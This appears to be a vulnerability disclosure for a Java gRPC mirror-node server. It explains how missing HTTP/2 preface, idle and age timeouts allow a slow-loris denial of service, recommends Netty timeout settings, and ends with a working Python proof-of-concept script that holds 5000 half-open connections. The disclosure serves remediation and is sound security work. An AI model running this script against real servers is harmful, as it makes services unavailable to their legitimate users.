### Title
Missing HTTP/2 Connection Preface Timeout Enables Slow-Loris DoS on gRPC Server

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures `NettyServerBuilder` with only `maxConcurrentCallsPerConnection`, leaving no `http2ConnectionPreface` timeout, no `maxConnectionIdle`, and no `maxConnectionAge`. An unauthenticated attacker can open a large number of TCP connections to port 5600 and trickle the HTTP/2 connection preface bytes one at a time, keeping each connection in a perpetual half-open state and exhausting server file descriptors, Netty channel memory, and thread-pool queue capacity until the server can no longer accept legitimate connections.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // ← NO http2ConnectionPreface(timeout, unit)
    // ← NO maxConnectionIdle(...)
    // ← NO maxConnectionAge(...)
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java` (lines 11–15) exposes only `maxConcurrentCallsPerConnection = 5`; there is no field for any connection-level timeout.

**Root cause:** `NettyServerBuilder` does not enforce a connection-preface deadline unless explicitly set via `http2ConnectionPreface(long, TimeUnit)`. Without it, Netty's `Http2ConnectionHandler` waits indefinitely for the 24-byte HTTP/2 preface (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`). Each such pending connection occupies a Netty `Channel` object, a file descriptor, and an entry in the server's accept queue.

**Failed assumption:** The developer assumed `maxConcurrentCallsPerConnection` is the relevant resource guard. It is not — it limits gRPC *calls* on an already-established HTTP/2 connection, not the number of TCP connections stuck in the preface phase.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5600 (directly exposed per `docker-compose.yml` line 61).
2. For each connection, attacker sends the HTTP/2 preface one byte every few seconds — fast enough to keep the socket alive at the OS level, slow enough to never complete the preface.
3. Server holds each `Channel` open indefinitely, accumulating Netty heap objects and file descriptors.
4. After enough connections (typically a few thousand, bounded by the JVM's open-file-descriptor limit), the server's `accept()` backlog fills and legitimate clients receive connection-refused or timeout errors.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection = 5` — applies only after HTTP/2 is fully negotiated; irrelevant here.
- No OS-level connection limit is configured in the application.
- The nginx proxy in `docker-compose.yml` proxies gRPC traffic but port 5600 is also bound directly on the host (`- 5600:5600`), bypassing the proxy entirely.

### Impact Explanation
A successful attack renders the gRPC mirror-node API completely unavailable: no new topic subscriptions can be established, no address-book queries can be served, and the JVM may OOM if Netty channel objects accumulate. Because the gRPC API is the primary interface for Hedera clients to receive consensus topic messages, this constitutes a total service outage for that component. Severity is **High** (DoS of a public-facing, unauthenticated endpoint with no rate-limiting).

### Likelihood Explanation
No authentication or prior relationship with the server is required. The attack requires only the ability to open TCP connections to port 5600 and a trivial script that writes one byte per second. It is repeatable, automatable, and can be amplified from a single host with thousands of file descriptors. The direct host-port binding (`5600:5600`) means cloud firewall rules or a load balancer are the only external mitigations, and neither is guaranteed in all deployment scenarios.

### Recommendation
In `grpcServerConfigurer()`, add the following to `NettyServerBuilder`:

```java
serverBuilder.http2ConnectionPreface(10, TimeUnit.SECONDS);   // drop slow-preface connections
serverBuilder.maxConnectionIdle(60, TimeUnit.SECONDS);         // reclaim idle connections
serverBuilder.maxConnectionAge(300, TimeUnit.SECONDS);         // bound connection lifetime
serverBuilder.maxConnectionAgeGrace(10, TimeUnit.SECONDS);
```

Expose the timeout values as fields in `NettyProperties` so they are configurable per environment. Additionally, consider placing a firewall rule or load-balancer connection-rate limit in front of port 5600 to prevent connection-flood amplification.

### Proof of Concept
```python
import socket, time, threading

TARGET = ("localhost", 5600)
# HTTP/2 preface: 24 bytes, sent 1 byte/sec to stall indefinitely
PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

def hold_connection():
    s = socket.socket()
    s.connect(TARGET)
    for byte in PREFACE:
        s.send(bytes([byte]))
        time.sleep(5)   # 5 s between bytes → 120 s to complete preface
    time.sleep(9999)    # keep socket open after preface if server accepts it

threads = [threading.Thread(target=hold_connection, daemon=True)
           for _ in range(5000)]
for t in threads:
    t.start()
# After ~5000 connections the server's fd table is exhausted;
# legitimate gRPC clients receive ECONNREFUSED or hang on connect().
time.sleep(9999)
```